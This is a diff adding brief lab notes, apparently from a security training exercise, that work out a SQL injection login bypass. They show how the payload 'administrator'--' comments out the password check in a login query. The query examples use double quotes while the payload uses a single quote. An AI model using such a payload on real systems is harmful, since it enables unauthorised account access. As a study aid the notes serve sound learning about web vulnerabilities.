@@ -1,0 +1,12 @@
+SQL Injection: Login functionality
+
+ENd goal: login as administrator 
+
+Analysis:
+--------
+SELECT firstname FROM users WHERE username="administrator" and password="password"
+SELECT firstname FROM users WHERE username="administrator"--" and password="password"
+	SELECT firstname FROM users WHERE username="administrator"
+
+
+therefore the payload will be {administrator'--}
